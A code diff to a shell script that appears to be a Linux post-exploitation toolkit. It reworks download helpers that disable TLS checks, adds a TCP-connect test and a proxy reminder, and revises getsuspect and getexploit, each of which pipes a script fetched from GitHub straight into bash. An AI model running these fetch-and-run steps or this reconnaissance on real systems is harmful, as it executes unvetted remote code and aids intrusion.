@@ -65,14 +65,14 @@ orc_loadURL () {
              $url = $ARGV[0];
              $ua->ssl_opts(verify_hostname => 0,SSL_verify_mode => 0x00);
              print get $url;
-             ' -- "$1"
+            ' -- "$1"
   elif orc_existsProg python; then
     # Do not insert the code because python is insert sensitive.
     PYTHONHTTPSVERIFY=0 python -c '
 import sys, urllib2
 request = urllib2.urlopen(sys.argv[1])
 sys.stdout.write(request.read())
-  ' "$1"
+    ' "$1"
   else
     echo 'Error: no download tool found'
     return 1
@@ -95,6 +95,14 @@ orc_tryTcpConnection () {
   elif orc_existsProg nmap; then
     # TCP connect scan with nmap
     nmap -oG - -Pn -sT -p "$2" "$1" | grep -q "/open/tcp/"
+  elif orc_existsProg perl; then
+    perl -e 'use IO::Socket;
+             $s = IO::Socket::INET->new(
+                  PeerAddr => $ARGV[0], PeerPort => $ARGV[1],
+                  Proto => "tcp", Type => SOCK_STREAM)
+                  or exit 1;
+             close $s;
+            ' -- "$1" "$2"
   elif orc_existsProg python; then
     # TCP connection open with python version 2
     # Do not insert the code because python is insert sensitive.
@@ -106,7 +114,7 @@ try:
 except:
   sys.exit(1)
 sys.exit(0)
-  ' "$1" "$2"
+    ' "$1" "$2"
   elif orc_existsProg nc; then
     # Open connection with netcat
     # Do not use option -N here because not all nc implementations support
@@ -163,7 +171,7 @@ orc_createEchoFile () {
   # Argument: Text to echo.
   # Global: set $ORC_ECHO_FILE to the created file.
   if [ $# -lt 1 ]; then
-    echo 'Error, missing text to echo.'
+    echo 'Error: missing text to echo.'
     return 1
   fi
   if [ "$HOME" = "" ]; then
@@ -181,6 +189,28 @@ orc_createEchoFile () {
   chmod a-rw,u=rwx "$ORC_ECHO_FILE"
   # The text must be single-quoted to prevent changes by the shell
   echo "echo '$*'" >> "$ORC_ECHO_FILE"
+}
+
+orc_httpsProxyReminder() {
+  # Remind the user if https_proxy is not set and
+  # tcp connection error to the server at port 443.
+  # Argument: Name or IP address of the server.
+  # Output to stdout: Reminder.
+  # Global: https_proxy variable is checked.
+  if [ $# -ne 1 ]; then
+    echo 'Error: missing host name'
+    return 1
+  fi
+  if [ -z "$https_proxy" ] && [ -z "$HTTPS_PROXY" ]; then
+    # no proxy is defined.
+    if ! orc_tryTcpConnection "$1" 443; then
+      # no connection and no proxy: remind
+      echo 'Info: connection problem, https_proxy could be needed'
+      return 2
+    fi
+  fi
+  # else: if https_proxy is defined, then never remind
+  return 0
 }
 
 # ~~~ User Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -351,7 +381,7 @@ getidle() {
   # Arguments : none
   # Globals   : our_pty could contain the number of our PTY
   export our_pty=$(ourpts)
-  stat /dev/pts/* -c '%n %X %U' |
+  stat "/dev/pts/*" -c '%n %X %U' |
   awk -v now="$(date +%s)" '$1 ~ /\/[0-9]+$/ {
       gsub( /[^0-9]/, "", $1 )
       list[$1]="PTY " $1 " is " now-$2 " seconds idle and owned by " $3
@@ -416,9 +446,15 @@ fi
 }
 
 getsuspect() {
-#ask and ye shall receive
-#this janky, awful shortcut
-orc_loadURL 'https://raw.githubusercontent.com/zMarch/suspect/master/suspect.sh' | bash
+  # Pulls my suspect tool from github.
+  # ask and ye shall receive
+  # this janky, awful shortcut
+  if ! orc_existsProg bash; then
+    echo 'Error: bash needed but not found.'
+    return 1
+  fi
+  orc_httpsProxyReminder raw.githubusercontent.com
+  orc_loadURL 'https://raw.githubusercontent.com/zMarch/suspect/master/suspect.sh' | bash
 }
 
 keyinstall() {
@@ -642,9 +678,15 @@ hangup() {
 }
 
 getexploit () {
-#need a better way to do this, honestly
-#i'd like to pass the -g argument to the script
-orc_loadURL 'https://raw.githubusercontent.com/bcoles/linux-exploit-suggester/master/linux-exploit-suggester.sh' | bash
+  # Download and run linux-exploit-suggester.
+  # need a better way to do this, honestly
+  # i'd like to pass the -g argument to the script
+  if ! orc_existsProg bash; then
+    echo 'Error: bash needed but not found.'
+    return 1
+  fi
+  orc_httpsProxyReminder raw.githubusercontent.com
+  orc_loadURL 'https://raw.githubusercontent.com/bcoles/linux-exploit-suggester/master/linux-exploit-suggester.sh' | bash
 }
 
 getenum() {
